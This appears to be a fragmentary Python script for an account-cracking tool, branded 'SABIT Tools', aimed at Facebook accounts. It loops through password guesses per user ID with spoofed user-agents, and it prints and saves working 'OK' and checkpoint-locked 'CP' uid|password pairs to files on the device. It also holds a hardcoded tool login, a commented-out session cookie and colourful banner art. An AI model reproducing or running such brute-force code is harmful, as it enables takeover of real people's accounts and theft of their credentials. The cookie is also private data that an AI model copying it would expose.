...
os.system('espeak -a 300 " Welcome,   to,  SABIT  Tools"')
...
while attemps < 12345677901:
    ...
    if username == 'cyber-king-sabit' and password == 'cyber-king-sabit':
...
for ua in range(5000):
	...
	ugen.append(alhaj)
os.system("xdg-open https://www.facebook.com/Sabit832088")
# LOGO
logo = ("""
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mSABIT-xd ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 • Hasibur Hossain Sabit ]   ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38msabit1111 ]   ║\33[1;34m   
╠══[REGIONAL                • BANGLADESH ]  ║\33[1;35m 
╠══[TOOLS                    • Free but only my users]         ║ \33[1;32m   
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK SABIT-OK.txt')
    print(' [😁] CP SABIT-CP.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[Sabit-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=9XoEZshEb_bU54i-eSyDoYLa; sb=9XoEZodMz1hsA1LrcK3BHO2p; m_pixel_ratio=2.5375001430511475; ps_n=0; ps_l=0; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2450%3Btimestamp%3A1711569713; vpd=v1%3B871x426x2.5375001430511475; wd=426x871; fr=084GZVAhH9OvU2rLs.AWXu8-y50gkDB0EwbAWUz46EELc.BmBHr1..AAA.0.0.BmBHtb.AWXjdpkMJ7k',
    'dpr': '2.5375001430511475',
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The Sabit𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The Sabit𝙁𝘼??𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mSabit-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/SabitCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
